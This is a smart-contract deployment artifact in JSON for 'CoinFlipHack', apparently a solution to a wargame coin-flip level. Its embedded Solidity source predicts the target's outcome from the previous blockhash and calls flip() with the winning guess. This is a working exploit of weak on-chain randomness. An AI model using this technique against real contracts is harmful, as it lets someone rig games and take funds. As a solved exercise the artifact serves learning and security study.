{
  "address": "0x5A055aC955C0cbA8Abe6Fc9bE35b2713af4984Bf",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_coinFlipAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "hackCoinFlip",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0xca485a3ac18e70792e940e3b0dc866f3c2109baa08ac63d42299681a1371ab38",
  "receipt": {
    "to": null,
    "from": "0x3d772032687fEd06350b1DD7457737Cc4cDb5E2f",
    "contractAddress": "0x5A055aC955C0cbA8Abe6Fc9bE35b2713af4984Bf",
    "transactionIndex": 1,
    "gasUsed": "266377",
    "logsBloom": "0x
    "blockHash": "0xf7a4ac65741cda87cfcfc07ea4e4d272ceaa43550a546f116a85662ad95c7300",
    "transactionHash": "0xca485a3ac18e70792e940e3b0dc866f3c2109baa08ac63d42299681a1371ab38",
    "logs": [],
    "blockNumber": 10791630,
    "cumulativeGasUsed": "287377",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0x4dF32584890A0026e56f7535d0f2C6486753624f"
  ],
  "numDeployments": 2,
  "solcInputHash": "45c8b503369bccbe4032f74c42dc20e6",
  "metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_coinFlipAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"hackCoinFlip\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/coinFlip/coinFlipHack.sol\":\"CoinFlipHack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/math/SafeMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)\\n\\npragma solidity ^0.8.0;\\n\\n// CAUTION\\n// This version of SafeMath should only be used with Solidity 0.8 or later,\\n// because it relies on the compiler's built in overflow checks.\\n\\n/**\\n * @dev Wrappers over Solidity's arithmetic operations.\\n *\\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\\n * now has built in overflow checking.\\n */\\nlibrary SafeMath {\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            uint256 c = a + b;\\n            if (c < a) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b > a) return (false, 0);\\n            return (true, a - b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\\n            // benefit is lost if 'b' is also tested.\\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\n            if (a == 0) return (true, 0);\\n            uint256 c = a * b;\\n            if (c / a != b) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a / b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a % b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity's `+` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Addition cannot overflow.\\n     */\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a + b;\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting on\\n     * overflow (when the result is negative).\\n     *\\n     * Counterpart to Solidity's `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a - b;\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity's `*` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Multiplication cannot overflow.\\n     */\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a * b;\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * Counterpart to Solidity's `/` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a / b;\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\n     * reverting when dividing by zero.\\n     *\\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\n     * invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a % b;\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\\n     * overflow (when the result is negative).\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {trySub}.\\n     *\\n     * Counterpart to Solidity's `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b <= a, errorMessage);\\n            return a - b;\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a / b;\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\n     * reverting with custom message when dividing by zero.\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {tryMod}.\\n     *\\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\n     * invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function mod(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a % b;\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x0f633a0223d9a1dcccfcf38a64c9de0874dfcbfac0c6941ccf074d63a2ce0e1e\",\"license\":\"MIT\"},\"contracts/coinFlip/coinFlipHack.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.7;\\nimport \\\"@openzeppelin/contracts/utils/math/SafeMath.sol\\\";\\n\\ninterface CoinFlipInterface {\\n    function flip(bool _guess) external returns (bool);\\n}\\n\\ncontract CoinFlipHack {\\n    using SafeMath for uint256;\\n\\n    uint256 FACTOR =\\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\\n    address coinFlipAddress;\\n\\n    constructor(address _coinFlipAddress) {\\n        coinFlipAddress = _coinFlipAddress;\\n    }\\n\\n    function hackCoinFlip() public {\\n        uint256 blockValue = uint256(blockhash(block.number.sub(1)));\\n        uint256 coinFlip = blockValue.div(FACTOR);\\n        bool side = coinFlip == 1 ? true : false;\\n\\n        CoinFlipInterface(coinFlipAddress).flip(!side);\\n    }\\n}\\n\",\"keccak256\":\"0x3020b15b8a817ec3816172b9fe0019a8585cfccec6327deb60646e11442ac312\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x60806040527f800000000000000000000000000000000000000000000000000000000000000060005534801561003457600080fd5b50604051610438380380610438833981810160405281019061005691906100b2565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061012d565b6000815190506100ac81610116565b92915050565b6000602082840312156100c8576100c7610111565b5b60006100d68482850161009d565b91505092915050565b60006100ea826100f1565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61011f816100df565b811461012a57600080fd5b50565b6102fc8061013c6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806342d69d7b14610030575b600080fd5b61003861003a565b005b600061005060014361013990919063ffffffff16565b4060001c9050600061006d6000548361014f90919063ffffffff16565b9050600060018214610080576000610083565b60015b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6782156040518263ffffffff1660e01b81526004016100e191906101b6565b602060405180830381600087803b1580156100fb57600080fd5b505af115801561010f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610133919061017a565b50505050565b600081836101479190610202565b905092915050565b6000818361015d91906101d1565b905092915050565b600081519050610174816102af565b92915050565b6000602082840312156101905761018f6102aa565b5b600061019e84828501610165565b91505092915050565b6101b081610236565b82525050565b60006020820190506101cb60008301846101a7565b92915050565b60006101dc82610242565b91506101e783610242565b9250826101f7576101f661027b565b5b828204905092915050565b600061020d82610242565b915061021883610242565b92508282101561022b5761022a61024c565b5b828203905092915050565b60008115159050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600080fd5b6102b881610236565b81146102c357600080fd5b5056fea26469706673582212208fa1a9d126c0f72135bf5c4d6f163a414a76ed959c6ae6c991b2010d21d24b8664736f6c63430008070033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b506004361061002b5760003560e01c806342d69d7b14610030575b600080fd5b61003861003a565b005b600061005060014361013990919063ffffffff16565b4060001c9050600061006d6000548361014f90919063ffffffff16565b9050600060018214610080576000610083565b60015b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6782156040518263ffffffff1660e01b81526004016100e191906101b6565b602060405180830381600087803b1580156100fb57600080fd5b505af115801561010f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610133919061017a565b50505050565b600081836101479190610202565b905092915050565b6000818361015d91906101d1565b905092915050565b600081519050610174816102af565b92915050565b6000602082840312156101905761018f6102aa565b5b600061019e84828501610165565b91505092915050565b6101b081610236565b82525050565b60006020820190506101cb60008301846101a7565b92915050565b60006101dc82610242565b91506101e783610242565b9250826101f7576101f661027b565b5b828204905092915050565b600061020d82610242565b915061021883610242565b92508282101561022b5761022a61024c565b5b828203905092915050565b60008115159050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600080fd5b6102b881610236565b81146102c357600080fd5b5056fea26469706673582212208fa1a9d126c0f72135bf5c4d6f163a414a76ed959c6ae6c991b2010d21d24b8664736f6c63430008070033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 328,
        "contract": "contracts/coinFlip/coinFlipHack.sol:CoinFlipHack",
        "label": "FACTOR",
        "offset": 0,
        "slot": "0",
        "type": "t_uint256"
      },
      {
        "astId": 330,
        "contract": "contracts/coinFlip/coinFlipHack.sol:CoinFlipHack",
        "label": "coinFlipAddress",
        "offset": 0,
        "slot": "1",
        "type": "t_address"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_uint256": {
        "encoding": "inplace",
        "label": "uint256",
        "numberOfBytes": "32"
      }
    }
  }
}